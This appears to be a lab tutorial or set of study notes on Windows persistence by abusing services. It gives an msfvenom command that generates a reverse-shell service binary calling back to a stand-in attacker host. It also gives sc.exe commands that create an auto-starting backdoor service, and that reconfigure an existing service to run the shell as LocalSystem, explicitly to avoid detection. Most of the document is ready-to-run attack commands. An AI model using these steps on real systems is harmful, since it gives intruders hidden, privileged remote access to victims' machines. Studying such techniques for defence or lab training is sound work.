# Abusing Services

A service is basically an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.

## Creating backdoor services

First, lets create a reverse shell using msfvenom.

```
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

Transfer and save this reverse shell into c:\windows and create new service pointing to this revshell.

```
sc.exe create newservice binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start newservice
```

## Modifying existing services

Instead of creating new service, we can reuse an existing service to avoid detection.

List available services using

```
C:\> sc.exe query state=all
```

After finding the desired service, query the configuration as.

```
C:\> sc.exe qc newservice
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\newservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : newservice
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\Local Service
```

The key things to look here are,

* START\_TYPE
* BINARY\_PATH\_NAME
* SERVICE\_START\_NAME

This service auto executes `C:\MyService\newservice.exe` under the LocalService (Low Privilege) account.

Lets change the Binary path to point to our revshell executable we created using msfvenom and run it as LocalSystem (Highest Privilege).

```
C:\> sc.exe config newservice binPath= "C:\Windows\revshell.exe" start= auto obj= "LocalSystem"

```

Then we can stop and start the service as

```
sc.exe stop newservice
sc.exe start newservice
```



